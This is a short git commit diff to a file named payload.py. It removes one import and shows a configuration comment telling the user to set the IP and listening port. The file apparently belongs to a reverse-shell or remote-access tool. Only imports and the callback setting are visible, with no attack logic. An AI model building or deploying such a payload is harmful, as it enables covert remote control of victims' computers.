e511a72eaa52448fb0964fa0ad61a312251389c5
Virus Noir <67117684+VirusNoirrr@users.noreply.github.com>
2022-11-26 18:38:12 +0100

    Update payload.py

--- payload.py
+++ payload.py
@@ -1,4 +1,4 @@
-import struct,socket,subprocess,os,ultrarequests,platform,webbrowser as browser
+import struct,socket,subprocess,os,platform,webbrowser as browser
 
 #   Change IP to your ip and Port to the listening port
 IP = "127.0.0.1" #Host
